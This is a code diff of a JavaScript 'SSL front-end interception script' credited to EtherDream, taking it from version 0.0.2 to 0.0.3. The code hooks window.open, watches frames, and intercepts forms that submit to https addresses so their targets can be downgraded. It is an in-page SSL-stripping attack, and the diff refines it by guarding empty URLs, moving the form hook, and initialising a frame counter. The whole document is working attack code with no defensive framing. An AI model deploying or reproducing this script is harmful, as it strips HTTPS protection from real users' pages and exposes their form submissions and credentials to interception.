@@ -1,7 +1,7 @@
 <script>
 /**
  * SSL 前端拦截脚本
- *   @version 0.0.2
+ *   @version 0.0.3
  *   @author EtherDream 
  */
 (function() {
@@ -48,7 +48,9 @@
 	//
 	function winopen_factory(oldFn) {
 		return function(url) {
-			arguments[0] = downgradeUrl(url + '');
+			if (url) {
+				arguments[0] = downgradeUrl(url + '');
+			}
 			return oldFn.apply(this, arguments);
 		};
 	}
@@ -69,6 +71,17 @@
 				break;
 			}
 		} while(el = el.parentNode);
+	}, true);
+
+	//
+	// 监控提交到 https 的表单
+	//
+	document.addEventListener('submit', function(e) {
+		var el = e.target;
+
+		if (R_HTTPS.test(el.action)) {
+			hookEvent(el, 'onsubmit', 'action');
+		}
 	}, true);
 
 
@@ -109,17 +122,6 @@
 	}
 
 	//
-	// 监控提交到 https 的表单
-	//
-	document.addEventListener('submit', function(e) {
-		var el = e.target;
-
-		if (R_HTTPS.test(el.action)) {
-			hookEvent(el, 'onsubmit', 'action');
-		}
-	}, true);
-
-	//
 	// 替换页面中的框架页
 	//
 	function scanNode(el) {
@@ -149,7 +151,7 @@
 	}
 	else {
 		// 通过 window.frames 监控框架
-		var lastNum;
+		var lastNum = 0;
 		setInterval(function() {
 			if (lastNum != frames.length) {
 				lastNum = frames.length;
